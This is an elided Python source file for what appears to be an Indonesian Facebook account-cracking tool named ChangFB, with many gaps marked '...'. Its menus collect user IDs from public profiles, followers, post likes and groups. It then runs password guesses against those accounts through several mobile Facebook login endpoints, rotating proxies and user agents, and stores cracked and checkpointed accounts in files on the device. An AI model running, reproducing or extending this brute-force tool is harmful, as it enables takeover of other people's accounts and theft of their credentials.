...
def hamz_bot():
    ...
    menu()
print("    \33[m[\033[32m✓\33[m]\33[1;96m INFORMASI ADMIN CHANGFB")
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# بِســـــــــــــــــــــــــــــمِﷲِ•الرَّحْمَنِ•ارَّحِيم '
	fx = mark(sg, style=' bold green')
	sol().print(fx)
	print(x+'    ['+h+'+'+x+'] NAME LU GOBLOK : '+str(my_name))
	print(x+'    ['+h+'+'+x+'] ID PENGGUNA    : '+str(my_id))
	print(x+'    ['+h+'+'+x+'] ALAMAT IP      : '+str(sh['origin']))
	io = '''[yellow][01] CRACK PUBLIK      [06] CRACK FILE
[02] CRACK (MASSAL)    [07] CEK OPSI CEKPOIN
[03] CRACK PENGIKUT    [08] CEK HASIL CRACK
[04] CRACK LIKE POST   [09] GANTIN USER AGENT√
[05] CRACK GRUP PUBLIK [10] CRACK FILE V1[bold green]'''

	oi = nel(io, style='red')
	cetak(nel(oi, title='[bold green]  MENU CRACKING GOBLOK  [/bold green]'))
	ec = input(x+'    ['+p+'+'+x+'] PILIH GOBLOK 😛 : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
...
#-[1]----[ DUMP ID MASSAL ]-----#
def dump_massal():
	mas='[1] CRACK FROM FILE\n[2] CRACK MANUAL (PER ID)'
	...
	if pilih in ['1','01']:
		...
		print(x+'    ['+h+'+'+x+'] MASUKKAN TOTAL LIMIT [20]')
		try:
			jum = int(input(x+'    ['+p+'+'+x+'] JUMLAH ID : '))
		except ValueError:
		...
		for met in range(jum):
			...
			uid.append(kl)
	sed='# SAAT INI MENGUMPULKAN UIDS, TUNGGU SAMPAI OPSI BERIKUTNYA MUNCUL'
...
def dump_pengikut():
	...
	try:
		...
		teks = '# DUMP GAGAL ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()


#-[4]----[ CRACK LIKES THE POST ]-----#
def dump_likes():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID DARI LIKE POSTING'
	win2 = mark(win, style='bold green')
	sol().print(win2)
	pil = input(x+'    ['+p+'+'+x+'] MASUKAN ID POSTINGAN : ')
	try:
...
def dump_grup():
	...
	sol().print(au2)
	idgrup = input("    [+] MASUKKAN ID GRUP/NAMA PENGGUNA : ")
...
def crack_file():
	...
	try:vin = os.listdir('/sdcard/ChangFB-DATA/DUMP')
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/ChangFB-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/ChangFB-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/ChangFB-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		...
		lol = {}
		for isi in my_files:
			try:hem = open('/sdcard/ChangFB-DATA/CP/'+isi,'r').readlines()
			except:
				try:hem = open('/sdcard/ChangFB-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		geeh = input(x+'    ['+p+'f'+x+'] PILIH HASIL : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('/sdcard/ChangFB-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/ChangFB-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ChangFB-DATA/CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
		...
		try:vin = os.listdir('/sdcard/ChangFB-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'  ['+p+'>_'+x+'] PILIH : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/ChangFB-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
...
def setting():
	...
	teks = '[1] CRACK DARI AKUN TERTUA\n[2] CRACK DARI AKUN TERMUDA\n[3] CRACK RANDOM ID (DISARANKAN)'
	tak = nel(teks, style='green')
	cetak(nel(tak, title=' • SETTING • '))
	hu = input(x+'    ['+p+'f'+x+'] PILIH\33[m : ')
	if hu in ['1','01']:
	...
	ioz = '[1] METODE M-FACEBOOK\n[2] METODE FREE-FACEBOOK\n[3] METODE TOUCH-FACEBOOK\n[4] METODE MBASIC-FACEBOOK'
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title=' • METODE • '))
	hc = input(k+'    ['+p+'★'+k+'] PILIH\33[m : ')
	if hc in ['1','01']:
	...
	aplik = input(x+'    ['+p+'f'+x+'] PILIH\33[m : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	...
	cpres = input(x+'    ['+p+'f'+x+'] PILIH\33[m : ')
	if cpres in ['y','Y']:
		princp.append('ya')
	else:
		princp.append('no')
	...
	pwplus=input(x+'    ['+p+'f'+x+'] PILIH\33[m : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '  [•] GUNAKAN KOMA UNTUK PEMISAH\n  [•] GUNAKAN HURUF KECIL\n  [•] CONTOH : indonesia,merdeka,mantap'
		cetak(nel(krek, title=' • TAMBAHAN PASSWORD • '))
		pwku=input('    [\033[32m+\33[m]\33[m\33[1;96m MASUKKAN PASSWORD TAMBAHAN\33[m : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def crack(idf,pwv):
	...
	ua2 ='Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'prox_socks4://'+nip}
...
def cracktouch(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [FREE]-[%s/%s]-[OK:%s] [CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
